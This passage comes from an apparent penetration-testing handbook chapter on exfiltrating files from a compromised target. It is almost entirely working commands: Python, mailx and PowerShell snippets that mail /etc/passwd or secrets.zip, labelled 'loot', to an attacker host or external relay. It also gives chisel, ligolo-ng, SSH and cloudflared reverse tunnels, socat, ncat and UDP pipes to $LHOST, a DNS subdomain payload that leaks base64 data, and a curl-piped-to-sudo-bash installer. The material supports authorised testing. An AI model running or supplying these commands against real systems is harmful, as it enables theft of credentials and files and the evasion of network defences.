**External relay - curl SMTP + STARTTLS (587):**
```bash
curl --url "smtp://smtp.example.com:587" --ssl-reqd --user user:pass \
  --mail-from x@example.com --mail-rcpt you@example.com --upload-file /tmp/mail.txt
```

**External relay - curl SMTPS (465):**
```bash
curl --url "smtps://smtp.example.com:465" --ssl-reqd --user user:pass \
  --mail-from x@example.com --mail-rcpt you@example.com --upload-file /tmp/mail.txt
```

**External relay - python3 + smtplib STARTTLS (587):**
```bash
python3 -c 'import smtplib,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP("smtp.example.com",587); s.starttls(); s.login("user","pass"); s.send_message(m)'
```

**External relay - python3 + smtplib SMTPS (465):**
```bash
python3 -c 'import smtplib,ssl,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP_SSL("smtp.example.com",465,context=ssl._create_unverified_context()); s.login("user","pass"); s.send_message(m)'
```

**External relay - mailx:**
```bash
echo 'loot' | mailx -s 'report' -a /etc/passwd you@example.com
```

### Sending from Windows - SMTP / e-mail

**Our interceptor (`$LHOST`) - plain (25), `Send-MailMessage`:**
```powershell
Send-MailMessage -To "x@$LHOST" -From "x@example.com" -Subject "report" -Body "loot" -Attachments "C:\Users\Public\secrets.zip" -SmtpServer $LHOST -Port 25
```

**Our interceptor - STARTTLS (587, self-signed cert):**
```powershell
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
Send-MailMessage -To "x@$LHOST" -From "x@example.com" -Subject "report" -Body "loot" -Attachments "C:\Users\Public\secrets.zip" -SmtpServer $LHOST -Port 587 -UseSsl
```

**Our interceptor - .NET SmtpClient (25):**
```powershell
$m = New-Object Net.Mail.MailMessage("x@example.com","x@$LHOST","report","loot")
$m.Attachments.Add((New-Object Net.Mail.Attachment("C:\Users\Public\secrets.zip")))
(New-Object Net.Mail.SmtpClient($LHOST,25)).Send($m)
```

**Our interceptor - .NET SmtpClient STARTTLS (587):**
```powershell
$m = New-Object Net.Mail.MailMessage("x@example.com","x@$LHOST","report","loot")
$m.Attachments.Add((New-Object Net.Mail.Attachment("C:\Users\Public\secrets.zip")))
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$c = New-Object Net.Mail.SmtpClient($LHOST,587); $c.EnableSsl=$true; $c.Send($m)
```

**Our interceptor - curl.exe SMTP + STARTTLS (587):**
```cmd
curl.exe --url "smtp://%LHOST%:587" --ssl-reqd --mail-from x@example.com --mail-rcpt you@example.com --upload-file C:\Users\Public\secrets.zip
```

**Our interceptor - curl.exe SMTPS (465):**
```cmd
curl.exe --url "smtps://%LHOST%:465" --ssl-reqd --mail-from x@example.com --mail-rcpt you@example.com --upload-file C:\Users\Public\secrets.zip
```

**External relay - `Send-MailMessage` (STARTTLS, 587; present in PS 5.1, deprecated in PS7):**
```powershell
Send-MailMessage -To "you@example.com" -From "x@example.com" -Subject "report" -Body "loot" -Attachments "C:\Users\Public\secrets.zip" -SmtpServer "smtp.example.com" -Port 587 -UseSsl -Credential (Get-Credential)
```

**External relay - .NET SmtpClient (STARTTLS, 587):**
```powershell
$m = New-Object Net.Mail.MailMessage("x@example.com","you@example.com","report","loot")
$m.Attachments.Add((New-Object Net.Mail.Attachment("C:\Users\Public\secrets.zip")))
$c = New-Object Net.Mail.SmtpClient("smtp.example.com",587); $c.EnableSsl=$true
$c.Credentials = New-Object Net.NetworkCredential("user","pass"); $c.Send($m)
```

> `Send-MailMessage -UseSsl` and `SmtpClient.EnableSsl` mean **STARTTLS** (587), not SMTPS. For 465 (implicit) on Windows use `curl.exe --url smtps://` or python `SMTP_SSL`; for a self-signed cert use `ServerCertificateValidationCallback = {$true}`.

---

## 5. Reverse tunnels (the target dials out)

Works where **inbound** to the target is closed but the target can open outbound connections. The target brings up a tunnel to LHOST and we pull files through it.

### chisel - HTTP(S) tunnel (reverse)

**Install (Linux/Windows):**
```bash
curl https://i.jpillora.com/chisel! | sudo bash
```

**LHOST - server with reverse allowed:**
```bash
chisel server -p 8080 --reverse
```

**RHOST - expose the target's port on LHOST (`R:2222:127.0.0.1:22` = LHOST:2222 → RHOST:22):**
```bash
chisel client http://$LHOST:8080 R:2222:127.0.0.1:22
```

**LHOST - grab the file through the tunnel (scp over the wrapped SSH):**
```bash
scp -P 2222 $RHOST_user@127.0.0.1:/home/victim/secrets.zip .
```

**Simpler option: run HTTP on the target and wrap its port:**
```bash
# RHOST: serve a directory
python3 -m http.server 8081
# RHOST: wrap the target's 8081 to LHOST:8081
chisel client http://$LHOST:8080 R:8081:127.0.0.1:8081
# LHOST: pull the file
curl -O http://127.0.0.1:8081/secrets.zip
```

**Reverse SOCKS (for pivoting):**
```bash
# LHOST
chisel server -p 8080 --reverse
# RHOST - opens SOCKS on LHOST:1080, exiting through the target's network
chisel client http://$LHOST:8080 R:socks
# LHOST - route through it
proxychains curl http://<internal_host>/loot
```

### ligolo-ng - IP-level reverse tunnel

**LHOST - proxy (generates the cert and address):**
```bash
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

**RHOST - the agent connects back to us:**
```bash
./agent -connect $LHOST:11601 -ignore-cert
```

Then in the proxy console: `session` → pick the agent → `ifconfig` → create the `ligolo` interface → `start`, and browse the target network with normal tools.

### ssh -R - if you have SSH credentials

**RHOST - reverse-forward its own SSH to LHOST:2222:**
```bash
ssh -R 2222:127.0.0.1:22 $LHOST_user@$LHOST -N
```

**LHOST - grab the file through the forward:**
```bash
scp -P 2222 $RHOST_user@127.0.0.1:/home/victim/secrets.zip .
```

### cloudflared / ngrok - expose the target's service publicly

**RHOST - start a local HTTP server:**
```bash
python3 -m http.server 8000
```

**RHOST - expose it to the internet (you get a public URL):**
```bash
cloudflared tunnel --url http://localhost:8000
```

**ngrok - an alternative:**
```bash
ngrok http 8000
```

**LHOST - grab the file from the issued URL:**
```bash
curl -O https://<issued-url>/secrets.zip
```

---

## 6. TLS and UDP - raw channels

When HTTP isn't needed or doesn't pass, but a TLS port or UDP is open.

### TLS via socat

**LHOST - TLS listener, writing to a file:**
```bash
socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,reuseaddr,fork OPEN:secrets.zip,creat,append
```

**RHOST (Linux) - send the file over TLS:**
```bash
socat -u FILE:secrets.zip OPENSSL:$LHOST:4443,verify=0
```

### TLS via ncat

**LHOST - TLS listener:**
```bash
ncat --ssl -lvnp 4443 > secrets.zip
```

**RHOST (Linux) - send:**
```bash
ncat --ssl $LHOST 4443 < secrets.zip
```

**RHOST (Windows) - ncat.exe:**
```cmd
ncat.exe --ssl %LHOST% 4443 < C:\Users\Public\secrets.zip
```

### openssl s_server / s_client

**LHOST - TLS receiver (key/cert required):**
```bash
openssl s_server -quiet -accept 4443 -key key.pem -cert cert.pem > secrets.zip
```

**RHOST - send the file:**
```bash
openssl s_client -quiet -connect $LHOST:4443 < secrets.zip
```

### UDP (when outbound TCP is blocked)

**LHOST - UDP receiver:**
```bash
nc -u -lvnp 4444 > loot.bin
```

**RHOST (Linux) - /dev/udp, no tools:**
```bash
cat loot.bin > /dev/udp/$LHOST/4444
```

> UDP has no delivery guarantees - use it only for small files or strings. Compress anything large first ([10 - Encoding](10-encoding.md)).

---

## 7. Blind / OOB exfil (proving delivery + crumbs of data)

For when you only need to confirm an outbound channel or extract a tiny amount (an ID, a hash, a short string).

### interactsh - OOB domain

**LHOST - start the client (it prints a unique domain):**
```bash
interactsh-client
```

**RHOST - ping outbound (visible on LHOST):**
```bash
nslookup test.<UNIQUE_DOMAIN>
```

**RHOST - smuggle a chunk of data in a subdomain (base32, ≤63 chars per label):**
```bash
curl -s "http://$(base64 -w0 loot.txt | head -c 60 | tr '+/' 'ab').<UNIQUE_DOMAIN>/"
```

### Burp Collaborator

Same idea as interactsh: generate a Collaborator domain in Burp and hit it (`nslookup`, `curl`). Full DNS exfil is in [12 - DNS / ICMP](12-dns-icmp.md).

> OOB is no good for files (too little data per request) - it's for blind confirmation and small leaks.

---

## Integrity check (mandatory)

After every transfer, compare the hash on both ends - a corrupted byte from text mode or a dropped connection isn't always obvious.

**Linux (both LHOST and RHOST):**
```bash
sha256sum secrets.zip
```

**Windows (PowerShell):**
```powershell
Get-FileHash secrets.zip -Algorithm SHA256
```

**Windows (CMD):**
```cmd
certutil -hashfile secrets.zip SHA256
```

Hashes match → the file is intact. They don't → resend in binary mode or via [10 - Encoding](10-encoding.md). More diagnostics in [14-troubleshooting.md](14-troubleshooting.md).

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [07 - Netcat](07-netcat.md) · [10 - Encoding](10-encoding.md) · [11 - Encryption](11-encryption.md) · [12 - DNS / ICMP](12-dns-icmp.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

More detail - [README](../../README.md#notation-and-variables).

---

[← Back to the handbook](../../README.md)
